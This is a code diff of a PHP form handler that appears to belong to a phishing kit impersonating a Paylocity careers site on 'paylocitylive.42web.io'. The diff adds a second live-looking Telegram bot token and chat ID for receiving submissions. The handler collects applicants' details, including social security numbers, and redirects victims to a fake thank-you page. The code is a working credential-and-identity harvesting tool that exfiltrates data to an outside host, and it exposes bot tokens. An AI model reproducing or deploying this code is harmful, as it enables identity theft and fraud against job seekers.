@@ -6,7 +6,7 @@ $site_map = [
     "paylocitylive.42web.io" => [
         "bots" => [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
-            ["token" => "TOKEN2", "chat_id" => "CHATID2"],
+            ["token" => "7688665277:AAEim49LrUZ3x8zLwQ5pOjDofnsCS4mKFmM", "chat_id" => "2068911019"],
         ],
         "redirect" => "https://paylocitylive.42web.io/cache_site/careers/all-listings.job.34092/thankyou.html"
     ],
@@ -73,7 +73,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $job_type = htmlspecialchars($_POST['q24_jobType'] ?? '');
     $source = htmlspecialchars($_POST['q21_howDid21'] ?? '');
     $ssn = htmlspecialchars($_POST['q25_socSec'] ?? '');
-    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+    $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
     $timestamp = date("Y-m-d H:i:s");
 
     // 📦 Upload handler
